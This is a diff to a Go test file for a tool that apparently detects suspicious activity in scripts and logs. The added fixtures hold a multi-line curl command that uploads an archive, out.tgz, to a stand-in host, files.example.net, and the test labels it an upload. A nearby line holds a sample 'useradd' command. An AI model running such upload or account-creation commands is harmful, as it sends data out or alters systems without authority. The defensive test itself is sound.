@@ -450,6 +450,20 @@ func TestBuildNumbersLines(t *testing.T) {
 	if got := steps["log.jsonl"].Activities; len(got) != 1 || got[0].Evidence[0].Line != 0 || got[0].Evidence[0].Text != "useradd -m other" {
 		t.Errorf("a decoded report: %+v, want the command without a line", got)
 	}
+	// A command continued over lines ends on a line of the file, or has none.
+	continued := map[string]string{
+		"a.sh":      "#!/bin/bash\ncurl -s \\\n  -T out.tgz \\\n  https://files.example.net/up\n",
+		"log.jsonl": `{"cmdline":"curl -s \\\n -T out.tgz https://files.example.net/up"}` + "\n",
+	}
+	for _, s := range Build(files[:2], continued, loadTables(t)).Steps {
+		want := map[string][2]int{"a.sh": {2, 4}, "log.jsonl": {0, 0}}[s.File.Path]
+		if len(s.Activities) != 1 || len(s.Activities[0].Evidence) != 1 {
+			t.Fatalf("%s: activities = %+v, want one upload on one line", s.File.Path, s.Activities)
+		}
+		if e := s.Activities[0].Evidence[0]; e.Line != want[0] || e.Last != want[1] {
+			t.Errorf("%s: the upload stands on lines %d to %d, want %d to %d", s.File.Path, e.Line, e.Last, want[0], want[1])
+		}
+	}
 	found := map[string]int{}
 	for _, m := range steps["notes.txt"].Matches {
 		found[m.Value] = m.Line
